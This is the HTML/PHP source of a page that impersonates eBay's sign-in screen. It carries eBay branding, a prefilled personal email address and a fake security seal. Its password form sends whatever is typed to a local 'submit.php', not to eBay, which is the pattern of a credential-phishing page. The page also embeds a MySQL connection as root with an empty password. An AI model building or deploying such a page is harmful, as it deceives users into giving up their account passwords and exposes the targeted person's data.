<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in of Registre | eBay</title>
    <link rel="stylesheet" href="stylex.css">
</head>
<body>
    <div class="container">
        <nav>
        <ul>
    <li><a href="https://connect.ebay.com/srv/survey/a/reg.personalized" target="_blank" aria-label="Tell us what you think - Link opens in a new window">Tell us what you think</a></li>
        </ul>
        </nav>
        <td class="gh-td">
        <a href="https://www.ebay.com/"><img width="250" height="200" style="clip:rect(47px, 118px, 95px, 0px);position:absolute;top:-8px;left:16px;"  src="image/1.png">
</a>
 
        </td>
        <div class="menu">
        <div class="center">
        <h1 id="greeting-msg" class="heading">Welcom</h1>
         <?php
    $con = mysqli_connect("localhost","root","","ebay");
    $sql='select * From annonce where   accepted like "1" ' ;
    $result = mysqli_query($con, $sql);
    ?>
        <span id="signin-reg-msg" tabindex = "-1" class="sub-heading">
            canelomichael9@gmail.com<br>
            Not you?
        <a id="create-account-link" href="https://reg.ebay.com/reg/PartialReg?siteid=0&amp;co_partnerId=0&amp;UsingSSL=1&amp;rv4=1&amp;ru=https%3A%2F%2Fwww.ebay.com%2F&amp;signInUrl=https%3A%2F%2Fwww.ebay.com%2Fsignin%3Fsgn%3Dreg%26siteid%3D0%26co_partnerId%3D0%26UsingSSL%3D1%26rv4%3D1%26ru%3Dhttps%253A%252F%252Fwww.ebay.com%252F">Switch account</a>
            
        </span> 
        
       <form method="post" id="signin-form" action="submit.php">
        <div class="txt_field">
          <input type="password" name="Password" required>
          <span></span>
          <label>Password</label>

        </div>
        <span></span>
        <a href="https://www.ebay.com/"><button input type="submit" name="submiit" value="Sign in" id="signin-continue-btn" name="signin-continue-btn" class="btn btn--fluid btn--large btn--primary" data-ebayui="" type="submit" name="submiit">Sign in</button></a>


             <div class="accordion-head"><a id="need-help-signin-link" tabindex="0" role="button" aria-expanded="false">Need help signing in?<svg class="icon icon--chevron-down" focusable="false"><use xlink:href="#icon-chevron-down"></use></svg></a></div>
          </form>
   
        
      




        </div>
<footer id="glbfooter" role="contentinfo" class="gh-w gh-flex">
  <div><div id="rtm_html_1650"></div><div id="rtm_html_1651"></div></div>
  <h2 class="gh-ar-hdn">Additional site navigation</h2>
  <div id="gf-t-box"><table class="gf-t" role="presentation"><tbody>
    <tr valign="top"><td class="gf-legal">Copyright © 1995-2021 eBay Inc. All Rights Reserved. <a href="https://www.ebayinc.com/accessibility/">Accessibility</a>,
     <a href="https://pages.ebay.com/help/policies/user-agreement.html">User Agreement</a>, <a href="https://pages.ebay.com/help/policies/privacy-policy.html">Privacy</a>, <a href="https://pages.ebay.com/help/account/cookies-web-beacons.html">Cookies</a>, <a href="https://www.ebay.com/adchoice/ccpa">Do not sell my personal information</a> and <a href="https://www.ebay.com/adchoice" id="gf-AdChoice">AdChoice</a></td><td nowrap="" align="center"><a title="Verify site's SSL certificate" _exsp="m571.l3943" href="https://seal.digicert.com/seals/popup/?tag=BIEBu4RK&amp;url=www.ebay.com&amp;lang=en&amp;cbr=1624802552824" onclick="this.href='https://seal.digicert.com/seals/popup/?tag=BIEBu4RK&amp;url=#D#&amp;lang=en&amp;cbr=1624802552824'.replace(/#D#/,location.host).replace(/#C#/, Date.now());return true" rel="noreferrer"><i id="gf-norton">Norton Secured - powered by DigiCert</i></a></td></tr></tbody></table></div><!--[if lt IE 9]></div><![endif]--></footer>


        </div>

    </div>


       

</body>
</html>
